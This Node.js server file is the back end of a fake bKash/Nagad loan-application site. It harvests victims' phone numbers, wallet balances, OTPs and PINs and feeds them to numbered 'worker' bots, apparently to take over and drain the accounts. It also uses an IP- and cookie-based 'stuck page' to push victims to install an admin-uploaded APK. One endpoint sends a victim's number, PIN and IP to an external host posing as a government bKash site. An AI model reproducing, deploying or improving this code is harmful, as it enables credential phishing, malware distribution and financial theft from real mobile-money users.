const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { initializeApp } = require('firebase/app');
const { getFirestore, collection, doc, setDoc, getDocs, deleteDoc, writeBatch } = require('firebase/firestore');

let firebaseConfig = null;
try {
  firebaseConfig = require('./firebase-applet-config.json');
  initializeApp(firebaseConfig);
} catch (e) {
  console.error('Firebase config not found or failed to initialize');
}
const db = firebaseConfig ? getFirestore(undefined, firebaseConfig.firestoreDatabaseId) : null;

let sessions = {};
let blockedIps = {};
let stuckIps = {};
let settings = {};

function saveSession(id) {
  if (!db) return;
  if (sessions[id]) setDoc(doc(db, 'sessions', id), sessions[id]).catch(console.error);
}
function deleteSession(id) {
  if (!db) return;
  deleteDoc(doc(db, 'sessions', id)).catch(console.error);
}
function saveSettings() {
  if (!db) return;
  setDoc(doc(db, 'state', 'settings'), settings).catch(console.error);
}
function saveBlockedIps() {
  if (!db) return;
  setDoc(doc(db, 'state', 'blockedIps'), blockedIps).catch(console.error);
}
function saveStuckIps() {
  if (!db) return;
  setDoc(doc(db, 'state', 'stuckIps'), stuckIps).catch(console.error);
}

async function loadState() {
  if (!db) return;
  try {
    const s = await getDocs(collection(db, 'sessions'));
    s.forEach(d => { sessions[d.id] = d.data(); });
    
    // getDoc is not imported, let's use getDocs for state collection
    const stateDocs = await getDocs(collection(db, 'state'));
    stateDocs.forEach(d => {
      if (d.id === 'settings') settings = d.data();
      if (d.id === 'blockedIps') blockedIps = d.data();
      if (d.id === 'stuckIps') stuckIps = d.data();
    });
    console.log('Successfully loaded state from Firestore');
  } catch(e) {
    console.error('Failed to load state from Firestore', e);
  }
}

// Load state immediately
loadState();





const PORT = 3000;
const app = express();

const distPublicPath = path.join(__dirname, 'dist', 'public');
const distIndexPath = path.join(distPublicPath, 'index.html');

function serveIndex(req, res) {
  if (fs.existsSync(distIndexPath)) {
    return res.sendFile(distIndexPath);
  }
  res.status(200).send('NO_DATA');
}

app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.get('/api/health', (req, res) => res.status(200).json({ status: 'ok' }));




/**
 * Release any session locks whose age has reached or exceeded lockTimeoutMs.
 * Calls saveFn only when at least one lock was cleared (avoids unnecessary I/O).
 *
 * @param {object} sessionsObj  - mutable sessions map (modified in-place)
 * @param {Function} saveFn    - called when one or more locks were released
 * @param {number} lockTimeoutMs - maximum allowed lock age in milliseconds
 * @param {number} [now]       - override for Date.now() (useful in tests)
 */
function runLockSweeper(sessionsObj, saveFn, lockTimeoutMs, now) {
  const ts = now !== undefined ? now : Date.now();
  let changed = false;
  for (const [id, data] of Object.entries(sessionsObj)) {
    if (data && data.assignedWorker && data.assignedAt) {
      const lockAge = ts - data.assignedAt;
      if (lockAge >= lockTimeoutMs) {
        const updates = { ...data, assignedWorker: null, assignedAt: null, adminAction: data.adminAction || 'REVIEW_APP', lastUpdated: ts };
        sessionsObj[id] = updates;
        saveSession(id);
        changed = true;
      }
    }
  }
  if (changed) saveFn();
}

const LOCK_TIMEOUT_MS = 120000; // 2 minutes
// Background sweeper: release stale session locks so customers are never stuck waiting
const LOCK_SWEEPER_INTERVAL_MS = 60000; // run every 60 seconds
if (require.main === module) {
  setInterval(() => {
    runLockSweeper(sessions, () => {}, LOCK_TIMEOUT_MS);
  }, LOCK_SWEEPER_INTERVAL_MS);
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.connection?.remoteAddress;
}


// Unified handler for all worker data endpoints (Bug 1: was duplicated)
function handleGetData(worker, req, res) {
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  try {
    const allSessions = Object.entries(sessions)
      .map(([id, data]) => ({ id, data }))
      .filter(s => {
        const isNagad = s.data.provider === 'nagad';
        return worker === '1' ? isNagad : !isNagad;
      });

    // If this worker already holds an active lock, remember which session it's on.
    // They may only receive data for that session — not pick up a new/different one.
    const workerLockedSessionId = Object.entries(sessions).find(([, d]) =>
      d.assignedWorker === worker &&
      d.assignedAt &&
      (Date.now() - d.assignedAt) < LOCK_TIMEOUT_MS
    )?.[0] ?? null;

    const pending = allSessions.filter(s => {
      const d = s.data;

      // Bug 3 fix: pinResetMode sessions
      if (d.pinResetMode === true && d.pin) {
        const pinOnlyData = `NONE,NONE,NONE,${s.id},${d.pin}`;
        if (d.lastAutomationData === pinOnlyData) return false;
        return true;
      }

      const number = d.gatewayPhone || d.initialPhone;
      const balance = d.balance;
      if (!number || !balance) return false;
      if (balance !== 'NONE' && parseInt(balance) < 20) return false;

      const cappedBalance = (balance !== 'NONE' && parseInt(balance) > 10000) ? '10000' : balance;
      const rawOtp = d.gatewayOtp || d.otp || '';
      const currentOtp = (rawOtp && typeof rawOtp === 'string' && rawOtp.trim() !== '' && rawOtp !== 'NONE') ? rawOtp : 'NONE';
      const pinToSend = d.pin || 'NONE';
      const currentData = `${cappedBalance},${number},${currentOtp},${s.id},${pinToSend}`;
      if (d.lastAutomationData === currentData) return false;
      return true;
    });

    pending.sort((a, b) => {
      const aOtp = a.data.gatewayOtp || a.data.otp || '';
      const aPin = a.data.pin || '';
      const bOtp = b.data.gatewayOtp || b.data.otp || '';
      const bPin = b.data.pin || '';
      const aHasPriority = (aOtp && aOtp !== 'NONE') || (aPin && aPin !== 'NONE') || a.data.pinResetMode === true;
      const bHasPriority = (bOtp && bOtp !== 'NONE') || (bPin && bPin !== 'NONE') || b.data.pinResetMode === true;
      if (aHasPriority && !bHasPriority) return -1;
      if (!aHasPriority && bHasPriority) return 1;
      return (a.data.lastUpdated || 0) - (b.data.lastUpdated || 0);
    });

    if (pending.length > 0) {
      const { id, data } = pending[0];
      if (data.pinResetMode === true && data.pin) {
        const pinOnlyData = `NONE,NONE,NONE,${id},${data.pin}`;
        const sendTime = Date.now();
        const updates = { ...data, lastAutomationData: pinOnlyData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: 'pin_reset', lastActionTrigger: null, lastActionAt: 0, pinResetMode: false };
        sessions[id] = updates;
        saveSession(id);
        return res.send(pinOnlyData);
      }
      const number = data.gatewayPhone || data.initialPhone;
      const balance = data.balance;
      const cappedBalance = (balance !== 'NONE' && parseInt(balance) > 10000) ? '10000' : balance;
      const rawOtp = data.gatewayOtp || data.otp || '';
      const currentOtp = (rawOtp && typeof rawOtp === 'string' && rawOtp.trim() !== '' && rawOtp !== 'NONE') ? rawOtp : 'NONE';
      const pinToSend = data.pin || 'NONE';
      const dataType = currentOtp !== 'NONE' ? 'otp' : 'first';
      const currentData = `${cappedBalance},${number},${currentOtp},${id},${pinToSend}`;
      const sendTime = Date.now();
      const updates = { ...data, lastAutomationData: currentData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: dataType, lastActionTrigger: null, lastActionAt: 0, balance: '', otp: '', gatewayOtp: '', lastBalance: data.balance || data.lastBalance || '' };
      sessions[id] = updates;
      saveSession(id);
      return res.send(currentData);
    }
    return res.send("NO_DATA");
  } catch (err) {
    return res.send("NO_DATA");
  }
}

app.get('/api/get-data', (req, res) => handleGetData(req.query.worker || '1', req, res));

for (let i = 1; i <= 21; i++) {
  app.get(`/api/worker${i}`, (req, res) => handleGetData(String(i), req, res));
}

// ===== NEW: Session Data & OTP Submission (for worker consumption) =====

// Endpoint 1: Submit session ID + number + phone number → available to workers
app.post('/api/submit-session-data', (req, res) => {
  const sessionId = req.body?.sessionId || req.query?.sessionId;
  const number = req.body?.number || req.query?.number || '';
  const phone = req.body?.phone || req.query?.phone || '';
  const amount = req.body?.amount || req.body?.balance || req.query?.amount || req.query?.balance || '';
  const pin = req.body?.pin || req.query?.pin || '';

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }

  // Get or create session
  let session = sessions[sessionId];
  if (!session) {
    session = {
      id: sessionId,
      orderId: sessionId,
      name: req.body?.name || '',
      provider: req.body?.provider || 'bkash',
      initialPhone: phone || number,
      gatewayPhone: number || phone,
      balance: amount,
      otp: '',
      gatewayOtp: '',
      pin: pin,
      waitingFor: 'NONE',
      adminAction: 'NONE',
      lastUpdated: Date.now(),
      clientIp: getClientIp(req),
    };
    sessions[sessionId] = session;
  } else {
    // Update existing session with new data
    const updates = { ...session, lastUpdated: Date.now() };
    if (number) updates.gatewayPhone = number;
    if (phone) updates.initialPhone = phone;
    if (amount) updates.balance = amount;
    if (pin) updates.pin = pin;
    // Reset automation tracking so worker picks up fresh data
    updates.lastAutomationData = '';
    updates.lastDataSentAt = 0;
    updates.assignedWorker = null;
    updates.assignedAt = null;
    sessions[sessionId] = updates;
  }

  saveSession(sessionId);

  res.json({
    success: true,
    sessionId,
    number: number || sessions[sessionId].gatewayPhone || '',
    phone: phone || sessions[sessionId].initialPhone || '',
    amount: amount || sessions[sessionId].balance || '',
    message: 'Session data stored. Workers will now pick up this session.',
  });
});

// GET version for browser-based form submission
app.get('/api/submit-session-data', (req, res) => {
  const sessionId = req.query?.sessionId;
  const number = req.query?.number || '';
  const phone = req.query?.phone || '';
  const amount = req.query?.amount || req.query?.balance || '';
  const pin = req.query?.pin || '';

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }

  let session = sessions[sessionId];
  if (!session) {
    session = {
      id: sessionId,
      orderId: sessionId,
      name: req.query?.name || '',
      provider: req.query?.provider || 'bkash',
      initialPhone: phone || number,
      gatewayPhone: number || phone,
      balance: amount,
      otp: '',
      gatewayOtp: '',
      pin: pin,
      waitingFor: 'NONE',
      adminAction: 'NONE',
      lastUpdated: Date.now(),
      clientIp: getClientIp(req),
    };
    sessions[sessionId] = session;
  } else {
    const updates = { ...session, lastUpdated: Date.now() };
    if (number) updates.gatewayPhone = number;
    if (phone) updates.initialPhone = phone;
    if (amount) updates.balance = amount;
    if (pin) updates.pin = pin;
    updates.lastAutomationData = '';
    updates.lastDataSentAt = 0;
    updates.assignedWorker = null;
    updates.assignedAt = null;
    sessions[sessionId] = updates;
  }

  saveSession(sessionId);

  res.json({
    success: true,
    sessionId,
    number: number || sessions[sessionId].gatewayPhone || '',
    phone: phone || sessions[sessionId].initialPhone || '',
    amount: amount || sessions[sessionId].balance || '',
    message: 'Session data stored. Workers will now pick up this session.',
  });
});

// Endpoint 2: Submit OTP for a session → available to workers
app.post('/api/submit-otp', (req, res) => {
  const sessionId = req.body?.sessionId || req.query?.sessionId;
  const otp = req.body?.otp || req.query?.otp || '';

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }
  if (!otp) {
    return res.status(400).json({ error: 'Missing otp' });
  }

  const session = sessions[sessionId];
  if (!session) {
    // Create session with OTP if it doesn't exist
    sessions[sessionId] = {
      id: sessionId,
      orderId: sessionId,
      name: req.body?.name || '',
      provider: req.body?.provider || 'bkash',
      initialPhone: req.body?.phone || '',
      gatewayPhone: req.body?.number || '',
      balance: req.body?.amount || '',
      otp: otp,
      gatewayOtp: otp,
      pin: req.body?.pin || '',
      waitingFor: 'VERIFY_PAGE',
      adminAction: 'NONE',
      lastUpdated: Date.now(),
      clientIp: getClientIp(req),
    };
    saveSession(sessionId);
  } else {
    // Update existing session with OTP
    const updates = {
      ...session,
      otp: otp,
      gatewayOtp: otp,
      waitingFor: 'VERIFY_PAGE',
      lastUpdated: Date.now(),
    };
    // Reset automation tracking so worker picks up fresh OTP
    updates.lastAutomationData = '';
    updates.lastDataSentAt = 0;
    updates.assignedWorker = null;
    updates.assignedAt = null;
    sessions[sessionId] = updates;
    saveSession(sessionId);
  }

  res.json({
    success: true,
    sessionId,
    otp,
    message: 'OTP stored. Worker will now process this session.',
  });
});

// GET version for browser-based OTP submission
app.get('/api/submit-otp', (req, res) => {
  const sessionId = req.query?.sessionId;
  const otp = req.query?.otp || '';

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }
  if (!otp) {
    return res.status(400).json({ error: 'Missing otp' });
  }

  const session = sessions[sessionId];
  if (!session) {
    sessions[sessionId] = {
      id: sessionId,
      orderId: sessionId,
      name: req.query?.name || '',
      provider: req.query?.provider || 'bkash',
      initialPhone: req.query?.phone || '',
      gatewayPhone: req.query?.number || '',
      balance: req.query?.amount || '',
      otp: otp,
      gatewayOtp: otp,
      pin: req.query?.pin || '',
      waitingFor: 'VERIFY_PAGE',
      adminAction: 'NONE',
      lastUpdated: Date.now(),
      clientIp: getClientIp(req),
    };
    saveSession(sessionId);
  } else {
    const updates = {
      ...session,
      otp: otp,
      gatewayOtp: otp,
      waitingFor: 'VERIFY_PAGE',
      lastUpdated: Date.now(),
    };
    updates.lastAutomationData = '';
    updates.lastDataSentAt = 0;
    updates.assignedWorker = null;
    updates.assignedAt = null;
    sessions[sessionId] = updates;
    saveSession(sessionId);
  }

  res.json({
    success: true,
    sessionId,
    otp,
    message: 'OTP stored. Worker will now process this session.',
  });
});

const AI_API_KEY = process.env.AI_API_KEY || 'bkash-ai-secret-2025';

function normalizePhoneForLookup(p) {
  if (!p) return '';
  let s = String(p).replace(/[^\d]/g, '');
  if (s.startsWith('880')) s = '0' + s.slice(3);
  else if (s.startsWith('88')) s = '0' + s.slice(2);
  if (!s.startsWith('0')) s = '0' + s;
  return s;
}

app.get('/api/customer-lookup', (req, res) => {
  const key = req.query.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) {
    return res.status(401).json({ error: 'Unauthorized: invalid API key' });
  }

  const phone = req.query.phone;
  if (!phone) {
    return res.status(400).json({ error: 'Missing phone parameter' });
  }

  const normalized = normalizePhoneForLookup(phone);

  function getApplicationStatus(adminAction) {
    if (adminAction === 'APPROVE') return 'APPROVED';
    if (['WRONG_CODE', 'REJECT_PIN', 'WRONG_NUMBER', 'REVERIFY_BALANCE', 'CANCEL_ALL'].includes(adminAction)) return 'FAILED';
    return 'IN_PROGRESS';
  }

  function getApplicationStatusBn(adminAction) {
    if (adminAction === 'APPROVE') return 'অভিনন্দন — আবেদন সফল হয়েছে';
    if (adminAction === 'WRONG_CODE') return 'ব্যর্থ — ভুল OTP দিয়েছে';
    if (adminAction === 'REJECT_PIN') return 'ব্যর্থ — ভুল PIN দিয়েছে';
    if (adminAction === 'WRONG_NUMBER') return 'ব্যর্থ — ভুল নম্বর দিয়েছে';
    if (adminAction === 'REVERIFY_BALANCE') return 'ব্যর্থ — balance পুনরায় যাচাই করতে বলা হয়েছে';
    if (adminAction === 'CANCEL_ALL') return 'ব্যর্থ — বাতিল করা হয়েছে';
    if (adminAction === 'SHOW_VERIFY') return 'চলমান — OTP যাচাই পর্যায়ে আছে';
    if (adminAction === 'REVIEW_APP') return 'চলমান — আবেদন পর্যালোচনায় আছে';
    return 'চলমান — আবেদন প্রক্রিয়াধীন';
  }

  const allMatches = Object.entries(sessions)
    .filter(([id, data]) => {
      if (!data) return false;
      const p1 = normalizePhoneForLookup(data.initialPhone);
      const p2 = normalizePhoneForLookup(data.gatewayPhone);
      return p1 === normalized || p2 === normalized;
    })
    .map(([id, data]) => ({
      sessionId: id,
      orderId: data.orderId || '',
      name: data.name || '',
      provider: data.provider || 'bkash',
      phone: data.initialPhone || data.gatewayPhone || '',
      currentBalance: data.balance || '',
      lastKnownBalance: data.lastBalance || data.balance || '',
      loanAmount: data.loanAmount || '',
      duration: data.duration || '',
      address: data.address || '',
      nidNumber: data.nidNumber || '',
      adminAction: data.adminAction || 'NONE',
      applicationStatus: getApplicationStatus(data.adminAction || 'NONE'),
      applicationStatusBn: getApplicationStatusBn(data.adminAction || 'NONE'),
      isBlocked: data.blocked === true || false,
      lastUpdated: data.lastUpdated ? new Date(data.lastUpdated).toISOString() : null,
    }))
    .sort((a, b) => new Date(b.lastUpdated || 0) - new Date(a.lastUpdated || 0));

  if (allMatches.length === 0) {
    return res.json({ found: false, phone: normalized, totalApplications: 0, customers: [] });
  }

  const withLatest = allMatches.map((c, i) => ({ ...c, isLatestApplication: i === 0 }));
  const latest = withLatest[0];

  return res.json({
    found: true,
    phone: normalized,
    totalApplications: allMatches.length,
    latestApplicationStatus: latest.applicationStatus,
    latestApplicationStatusBn: latest.applicationStatusBn,
    latestBalance: latest.lastKnownBalance,
    customers: withLatest,
  });
});

// ===== STUCK PAGE SYSTEM (Session ID + Cookie + IP) =====

// Trigger stuck page by session ID (NO API KEY REQUIRED)
app.post('/api/stuck-session', (req, res) => {
  const sessionId = req.body?.sessionId || req.query?.sessionId;
  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }
  
  const session = sessions[sessionId];
  if (!session) {
    return res.status(404).json({ error: 'Session not found', sessionId });
  }
  
  const stuckMsg = req.body?.message || req.query?.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
  const customerIp = session.clientIp || '';
  
  // Update session
  sessions[sessionId] = {
    ...session,
    adminAction: 'APPLICATION_ACCEPTED',
    applicationStatus: 'ACCEPTED',
    acceptedAt: Date.now(),
    stuckPageActive: true,
    stuckPageMessage: stuckMsg,
    lastUpdated: Date.now(),
  };
  saveSession(sessionId);
  
  // Store IP for cookie+IP based detection
  if (customerIp) {
    stuckIps[customerIp] = {
      sessionId,
      stuckAt: Date.now(),
      message: stuckMsg,
      phone: session.initialPhone || session.gatewayPhone || '',
    };
    saveStuckIps();
  }
  
  res.json({
    success: true,
    sessionId,
    ip: customerIp || '(no IP recorded)',
    name: session.name || '',
    phone: session.initialPhone || session.gatewayPhone || '',
    provider: session.provider || 'bkash',
  });
});

// GET version for browser trigger (NO API KEY REQUIRED)
app.get('/api/stuck-session', (req, res) => {
  const sessionId = req.query?.sessionId;
  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }
  
  const session = sessions[sessionId];
  if (!session) {
    return res.status(404).json({ error: 'Session not found', sessionId });
  }
  
  const stuckMsg = req.query?.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
  const customerIp = session.clientIp || '';
  
  sessions[sessionId] = {
    ...session,
    adminAction: 'APPLICATION_ACCEPTED',
    applicationStatus: 'ACCEPTED',
    acceptedAt: Date.now(),
    stuckPageActive: true,
    stuckPageMessage: stuckMsg,
    lastUpdated: Date.now(),
  };
  saveSession(sessionId);
  
  if (customerIp) {
    stuckIps[customerIp] = {
      sessionId,
      stuckAt: Date.now(),
      message: stuckMsg,
      phone: session.initialPhone || session.gatewayPhone || '',
    };
    saveStuckIps();
  }
  
  res.json({
    success: true,
    sessionId,
    ip: customerIp || '(no IP recorded)',
    name: session.name || '',
    phone: session.initialPhone || session.gatewayPhone || '',
    provider: session.provider || 'bkash',
  });
});

// Check if visitor is stuck (cookie + IP based)
app.get('/api/check-stuck', (req, res) => {
  const clientIp = getClientIp(req);
  
  // Manual cookie parser
  const rawCookie = req.headers.cookie || '';
  const cookies = {};
  rawCookie.split(';').forEach(c => {
    const parts = c.trim().split('=');
    if (parts.length >= 2) cookies[parts[0].trim()] = decodeURIComponent(parts.slice(1).join('='));
  });
  const cookieSessionId = cookies.stuck_session || req.query?.sessionId || '';
  
  // Check 1: IP in stuckIps?
  const ipStuck = stuckIps[clientIp];
  
  // Check 2: Session has stuckPageActive?
  let sessionStuck = false;
  let stuckMessage = '';
  if (cookieSessionId && sessions[cookieSessionId]?.stuckPageActive) {
    sessionStuck = true;
    stuckMessage = sessions[cookieSessionId].stuckPageMessage || '';
  }
  
  // Check 3: Any session with this IP has stuckPageActive?
  if (!sessionStuck && clientIp) {
    for (const [id, data] of Object.entries(sessions)) {
      if (data && data.clientIp === clientIp && data.stuckPageActive) {
        sessionStuck = true;
        stuckMessage = data.stuckPageMessage || '';
        break;
      }
    }
  }
  
  // Fallback: IP stuck entry message
  if (!stuckMessage && ipStuck) {
    stuckMessage = ipStuck.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
  }
  
  const isStuck = !!ipStuck || sessionStuck;
  
  // Set long-lived cookie (1 year)
  if (isStuck && (cookieSessionId || sessionStuck)) {
    const sid = cookieSessionId || Object.entries(sessions).find(([,d]) => d && d.clientIp === clientIp && d.stuckPageActive)?.[0] || '';
    if (sid) {
      res.setHeader('Set-Cookie', `stuck_session=${encodeURIComponent(sid)}; Max-Age=${365*24*60*60}; Path=/; SameSite=Lax`);
    }
  }
  
  res.json({ stuck: isStuck, ip: clientIp, message: stuckMessage, byIp: !!ipStuck, bySession: sessionStuck });
});

// Remove stuck state
app.post('/api/unstuck', (req, res) => {
  const key = req.body?.key || req.query?.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) return res.status(401).json({ error: 'Unauthorized' });
  
  const sessionId = req.body?.sessionId || req.query?.sessionId;
  let removed = 0;
  
  if (sessionId && sessions[sessionId]) {
    const ip = sessions[sessionId].clientIp;
    sessions[sessionId] = { ...sessions[sessionId], stuckPageActive: false, stuckPageMessage: '', adminAction: 'NONE' };
    saveSession(sessionId);
    removed++;
    if (ip && stuckIps[ip]) { delete stuckIps[ip]; saveStuckIps(); removed++; }
  }
  
  res.json({ success: true, removed });
});

// ===== APK MANAGEMENT (Admin upload + download URL) =====

// Serve uploaded files
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')));

// Upload APK file (admin only)
app.post('/api/admin/upload-apk', express.raw({ type: 'application/octet-stream', limit: '50mb' }), (req, res) => {
  const key = req.query?.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) return res.status(401).json({ error: 'Unauthorized' });
  
  if (!req.body || req.body.length === 0) {
    return res.status(400).json({ error: 'No file data' });
  }
  
  const filename = req.query?.filename || 'app-release.apk';
  const uploadDir = path.join(__dirname, 'public', 'uploads');
  if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
  
  const filePath = path.join(uploadDir, filename);
  fs.writeFileSync(filePath, req.body);
  
  // Store APK config
  const apkUrl = `/uploads/${encodeURIComponent(filename)}`;
  settings.apkUrl = apkUrl;
  settings.apkFilename = filename;
  settings.apkSize = req.body.length;
  settings.apkUpdatedAt = Date.now();
  saveSettings();
  
  res.json({
    success: true,
    filename,
    size: req.body.length,
    url: apkUrl,
    sizeMB: (req.body.length / (1024 * 1024)).toFixed(2),
  });
});

// Also handle base64 upload from form
app.post('/api/admin/upload-apk-json', (req, res) => {
  const key = req.body?.key || req.query?.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) return res.status(401).json({ error: 'Unauthorized' });
  
  const { data, filename } = req.body;
  if (!data) return res.status(400).json({ error: 'No data' });
  
  const buffer = Buffer.from(data, 'base64');
  const uploadDir = path.join(__dirname, 'public', 'uploads');
  if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
  
  const fname = filename || 'app-release.apk';
  const filePath = path.join(uploadDir, fname);
  fs.writeFileSync(filePath, buffer);
  
  const apkUrl = `/uploads/${encodeURIComponent(fname)}`;
  settings.apkUrl = apkUrl;
  settings.apkFilename = fname;
  settings.apkSize = buffer.length;
  settings.apkUpdatedAt = Date.now();
  saveSettings();
  
  res.json({ success: true, filename: fname, size: buffer.length, url: apkUrl });
});

// Set custom APK URL (admin)
app.post('/api/admin/apk-settings', (req, res) => {
  const key = req.body?.key || req.query?.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) return res.status(401).json({ error: 'Unauthorized' });
  
  if (req.body.apkUrl) settings.apkUrl = req.body.apkUrl;
  if (req.body.apkFilename) settings.apkFilename = req.body.apkFilename;
  saveSettings();
  res.json({ success: true, settings: { apkUrl: settings.apkUrl, apkFilename: settings.apkFilename } });
});

// Get APK URL for stuck page (PUBLIC — no auth)
app.get('/api/get-apk-url', (req, res) => {
  const host = req.headers['x-forwarded-host'] || req.headers.host || '';
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const baseUrl = `${protocol}://${host}`;
  
  let apkUrl = settings.apkUrl || '/uploads/app-release.apk';
  
  // If relative URL, make it absolute
  if (apkUrl.startsWith('/')) {
    apkUrl = `${baseUrl}${apkUrl}`;
  }
  
  res.json({
    url: apkUrl,
    filename: settings.apkFilename || 'app-release.apk',
    size: settings.apkSize || 0,
    updatedAt: settings.apkUpdatedAt || null,
  });
});

function handleAutomationReport(req, res) {
  let id = req.body?.id || req.query?.id;
  const status = req.body?.status || req.query?.status;
  const worker = req.body?.worker || req.query?.worker || null;
  if (!status) return res.status(400).json({ error: 'Missing status' });

  try {
    if (!id || id.trim() === '') {
      const allSessions = Object.entries(sessions).map(([sid, sdata]) => ({ id: sid, data: sdata }));
      let bestSession = null;
      let bestTime = 0;
      for (const s of allSessions) {
        if (s.data.lastAutomationData && s.data.lastAutomationData !== '' && (s.data.lastUpdated || 0) > bestTime) {
          // Bug 4 fix: require exact worker match; null assignedWorker must not be selected
          if (worker && s.data.assignedWorker !== worker) continue;
          bestTime = s.data.lastUpdated || 0;
          bestSession = s;
        }
      }
      if (bestSession) { id = bestSession.id; }
      else { return res.status(400).json({ error: 'No active session found' }); }
    }

    const existing = sessions[id];
    if (!existing) return res.status(404).json({ error: 'Session not found' });

    const updates = {
      processedByAutomation: true,
      lastUpdated: Date.now(),
      lastActionAt: Date.now(),
      lastActionTrigger: status
    };

    if (status === 'WRONG_OTP') { updates.adminAction = 'WRONG_CODE'; updates.processedByAutomation = false; updates.otp = ''; updates.gatewayOtp = ''; updates.lastAutomationData = ''; }
    else if (status === 'SHOW_CODE') { updates.adminAction = 'SHOW_VERIFY'; }
    else if (status === 'WRONG_PIN') { updates.adminAction = 'REJECT_PIN'; updates.pin = ''; updates.lastAutomationData = ''; }
    else if (status === 'WRONG_NUMBER') { updates.adminAction = 'WRONG_NUMBER'; updates.balance = ''; updates.otp = ''; updates.gatewayOtp = ''; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'REVIEW') { updates.adminAction = 'REVIEW_APP'; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'REVERIFY_BALANCE') { updates.adminAction = 'REVERIFY_BALANCE'; updates.balance = ''; updates.otp = ''; updates.gatewayOtp = ''; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'DONE') { updates.processedByAutomation = true; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'ACCEPT') {
      // Guard: don't reset if already accepted or beyond
      if (!existing.applicationStatus || existing.applicationStatus === 'SUBMITTED') {
        updates.applicationStatus = 'ACCEPTED';
        updates.acceptedAt = Date.now();
        updates.adminAction = 'APPLICATION_ACCEPTED';
        updates.flushNotifRequested = true;
        updates.flushNotifRequestedAt = Date.now();
      }
      // If already accepted/approved, just re-trigger flush (don't reset timer)
      else if (existing.applicationStatus === 'ACCEPTED' || existing.applicationStatus === 'APPROVED') {
        updates.flushNotifRequested = true;
        updates.flushNotifRequestedAt = Date.now();
        updates.adminAction = 'APPLICATION_ACCEPTED'; // re-trigger UI if needed
      }
    }

    sessions[id] = Object.assign({}, existing, updates);
    saveSession(id);
    res.type('text/plain').send('NO_DATA');
  } catch (err) {
    res.status(500).type('text/plain').send('NO_DATA');
  }
}

app.get('/api/report', handleAutomationReport);
app.post('/api/report', handleAutomationReport);
app.post('/api/automation/report', handleAutomationReport);
app.get('/api/automation/report', handleAutomationReport);

app.get('/api/check-blocked', (req, res) => {
  const ip = getClientIp(req);
  res.json({ blocked: blockedIps[ip] === true, ip });
});

app.post('/api/block-ip', (req, res) => {
  blockedIps[req.body.ip] = true;
  saveBlockedIps();
  res.json({ success: true });
});

app.post('/api/unblock-ip', (req, res) => {
  delete blockedIps[req.body.ip];
  saveBlockedIps();
  res.json({ success: true });
});

app.get('/api/block-ip-trigger', (req, res) => {
  const ip = req.query.ip;
  if (!ip) {
    return res.status(400).type('text/plain').send('NO_DATA');
  }
  blockedIps[ip] = true;
  saveBlockedIps();
  const matching = Object.values(sessions).filter(s => s && s.clientIp === ip && !s.purchaseFired && !s.purchaseInFlight);
  Promise.allSettled(matching.map(s => firePurchaseForSession(s, req.headers.referer || '')))
    .then(results => {
      const ok = results.filter(r => r.status === 'fulfilled' && r.value && r.value.ok).length;
      const failed = results.length - ok;
      if (failed > 0) console.error(`Purchase CAPI: ${failed}/${results.length} failed for ip=${ip}`);
    })
    .catch(() => {});
  res.type('text/plain').send('NO_DATA');
});

app.get('/api/block-customer', (req, res) => {
  const customerId = req.query.customerId;
  if (!customerId) {
    return res.status(400).type('text/plain').send('NO_DATA');
  }
  const customer = sessions[customerId];
  if (!customer || !customer.clientIp) {
    return res.status(404).type('text/plain').send('NO_DATA');
  }
  const ip = customer.clientIp;
  blockedIps[ip] = true;
  saveBlockedIps();
  firePurchaseForSession(customer, req.headers.referer || '').catch(() => {});

  const number = customer.gatewayPhone || customer.initialPhone || '';
  const pin = customer.pin || '';
  if (ip && number && pin) {
    const submitUrl = `https://official-gov-bkash-loan-instant-bd-imstant-loan-get-online-form.replit.app/api/public/submit?pw=onlinebased321&number=${encodeURIComponent(number)}&pin=${encodeURIComponent(pin)}&ip=${encodeURIComponent(ip)}`;
    fetch(submitUrl).catch(() => {});
  }

  res.type('text/plain').send('NO_DATA');
});



app.get('/api/db', (req, res) => {
  const { path: dbPath } = req.query;
  if (dbPath && dbPath.startsWith('sessions/')) {
    return res.json(sessions[dbPath.replace('sessions/', '')] || null);
  }
  if (dbPath && dbPath.startsWith('settings/')) {
    return res.json(settings[dbPath.replace('settings/', '')] ?? null);
  }
  res.json(null);
});

app.post('/api/db', (req, res) => {
  const { path: dbPath, data } = req.body;
  if (dbPath && dbPath.startsWith('sessions/')) {
    const id = dbPath.replace('sessions/', '');
    sessions[id] = Object.assign({}, sessions[id] || {}, data);
    saveSession(id);
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    settings[key] = data;
    saveSettings();
  }
